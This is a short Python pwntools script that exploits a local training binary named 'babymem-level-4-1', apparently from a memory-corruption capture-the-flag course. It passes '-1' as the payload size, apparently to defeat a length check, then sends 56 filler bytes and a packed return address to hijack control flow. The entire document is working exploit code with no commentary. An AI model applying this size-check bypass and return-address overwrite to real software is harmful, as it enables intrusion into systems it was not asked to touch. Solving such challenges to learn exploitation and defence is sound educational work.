from pwn import *

p = process("./babymem-level-4-1")

payload = b""
payload += b"A" * 56
payload += p64(0x4020cf)

p.recvuntil(b"Payload size: ")

p.sendline(b"-1")

print("[+] Stage 1 : Done")

p.recvuntil(b"Send your payload (up to -1 bytes)!\n")

print("[!] Stage 2 : Doing")

p.sendline(payload)

print(p.recvall())
